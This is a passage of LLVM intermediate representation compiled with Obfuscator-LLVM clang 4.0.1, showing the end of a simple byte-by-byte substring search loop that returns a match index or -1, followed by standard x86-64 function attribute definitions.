.lr.ph:                                           ; preds = %.lr.ph.preheader, %20
  %indvars.iv = phi i64 [ 0, %.lr.ph.preheader ], [ %indvars.iv.next, %20 ]
  %.016 = phi i32 [ 0, %.lr.ph.preheader ], [ %.1, %20 ]
  %8 = getelementptr inbounds i8, i8* %0, i64 %indvars.iv
  %9 = load i8, i8* %8, align 1
  %10 = sext i32 %.016 to i64
  %11 = getelementptr inbounds i8, i8* %2, i64 %10
  %12 = load i8, i8* %11, align 1
  %13 = icmp eq i8 %9, %12
  br i1 %13, label %14, label %20

; <label>:14:                                     ; preds = %.lr.ph
  %15 = add nsw i32 %.016, 1
  %16 = icmp eq i32 %15, %3
  br i1 %16, label %17, label %20

; <label>:17:                                     ; preds = %14
  %18 = trunc i64 %indvars.iv to i32
  %19 = add nsw i32 %18, 1
  br label %.loopexit

; <label>:20:                                     ; preds = %.lr.ph, %14
  %.1 = phi i32 [ %15, %14 ], [ 0, %.lr.ph ]
  %indvars.iv.next = add nuw nsw i64 %indvars.iv, 1
  %21 = icmp slt i64 %indvars.iv.next, %7
  br i1 %21, label %.lr.ph, label %.loopexit.loopexit

.loopexit.loopexit:                               ; preds = %20
  br label %.loopexit

.loopexit:                                        ; preds = %.loopexit.loopexit, %4, %17
  %.013 = phi i32 [ %19, %17 ], [ -1, %4 ], [ -1, %.loopexit.loopexit ]
  ret i32 %.013
}

attributes #0 = { noinline nounwind uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { nounwind "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #2 = { nounwind readnone "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #4 = { noreturn nounwind "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #5 = { noinline norecurse nounwind readonly uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #6 = { argmemonly nounwind }
attributes #7 = { noinline norecurse nounwind readnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #8 = { noinline norecurse nounwind uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #9 = { nounwind }
attributes #10 = { nounwind readnone }
attributes #11 = { noreturn nounwind }

!llvm.ident = !{!0, !0, !0, !0, !0, !0, !0, !0, !0, !0, !0, !0, !0, !0, !0, !0}

!0 = !{!"Obfuscator-LLVM clang version 4.0.1  (based on Obfuscator-LLVM 4.0.1)"}
!1 = !{i32 -2146844069}
!2 = !{i32 -2146843660}
